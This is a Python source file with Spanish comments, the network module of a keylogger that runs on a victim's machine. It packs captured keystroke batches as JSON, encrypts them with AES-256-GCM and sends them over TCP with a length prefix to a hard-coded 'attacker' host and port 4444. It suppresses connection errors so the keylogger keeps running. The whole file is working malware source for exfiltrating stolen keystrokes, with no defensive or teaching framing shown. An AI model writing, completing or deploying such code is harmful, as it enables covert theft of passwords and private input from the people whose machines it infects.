# transporte_victima.py — corre en la máquina víctima
"""
Módulo de envío TCP hacia la máquina atacante.

Protocolo de longitud prefijada:
  [ 4 bytes: tamaño del mensaje ][ N bytes: nonce + ciphertext + tag ]

El prefijo de 4 bytes permite al receptor saber exactamente
cuántos bytes leer, evitando mensajes cortados o fusionados
(problema clásico de TCP al ser un stream, no paquetes).

Intervalo de envío: configurable via FLUSH_INTERVAL en keylogger.py
"""

import json
import socket
import struct
from cifrado import encrypt

# ── Configuración ──────────────────────────────────────────────────────────────
ATTACKER_HOST = "192.168.1.100"  # IP de la máquina atacante (ajustar)
ATTACKER_PORT = 4444
CONNECT_TIMEOUT = 5.0            # segundos para timeout de conexión


def send_batch(batch: list) -> None:
    """
    Serializa, cifra y envía un batch de teclas al atacante.

    Flujo:
        batch (list de tuplas) → JSON bytes → AES-256-GCM → TCP

    El socket se abre y cierra por cada flush. Esto es menos
    eficiente que mantener una conexión persistente, pero más
    simple y resistente a reconexiones si el atacante reinicia.

    Parámetros:
        batch (list): lista de (timestamp_str, tecla_str)
    """
    try:
        payload   = json.dumps(batch).encode("utf-8")
        encrypted = encrypt(payload)

        # Prefijo de 4 bytes con el tamaño total (big-endian)
        length_prefix = struct.pack(">I", len(encrypted))

        with socket.create_connection(
            (ATTACKER_HOST, ATTACKER_PORT),
            timeout=CONNECT_TIMEOUT
        ) as sock:
            sock.sendall(length_prefix + encrypted)

    except (ConnectionRefusedError, OSError) as e:
        # Si el atacante no está escuchando, no crashear el keylogger
        print(f"[!] No se pudo enviar batch: {e}")